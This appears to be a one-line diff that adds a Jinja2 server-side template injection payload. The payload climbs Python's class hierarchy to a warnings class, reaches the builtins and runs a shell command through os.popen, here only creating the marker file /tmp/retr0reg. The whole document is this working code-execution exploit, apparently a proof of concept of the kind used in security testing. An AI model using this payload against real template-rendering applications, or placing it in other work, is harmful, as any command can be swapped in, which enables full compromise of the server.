@@ -1,0 +1,1 @@
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('touch /tmp/retr0reg')}}{%endif%}{% endfor %}
